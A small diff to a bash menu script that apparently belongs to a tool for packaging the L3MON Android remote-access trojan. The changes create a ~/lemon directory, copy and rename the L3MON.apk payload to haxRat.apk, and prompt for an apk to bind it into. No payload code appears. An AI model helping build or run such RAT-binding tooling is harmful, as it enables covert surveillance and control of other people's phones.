@@ -74,6 +74,9 @@ fi
 done
 }
 #<<<-----------program---------->>>
+if [[ ! -d "~/lemon" ]]; then
+mkdir ~/lemon > /dev/null 2>&1
+fi
 while true; do
 echo -e "
 ${B5} ${S2}choose your option from the list:-${R0} ${R1}
@@ -108,6 +111,7 @@ fi
       mv -v ${HOME}/lemon/L3MON.apk ${HOME}/lemon/post
     fi
     cp -r ${HOME}/haxrat/L3MON.apk ${HOME}/lemon
+    mv $HOME/haxrat/L3MON.apk $HOME/haxrat/haxRat.apk
     echo
     printf "\e[4;97mCSF \e[0;0;0m> \e[1;31mEnter your input apk (path/name.apk) ==> \e[0m"
     read inputapk
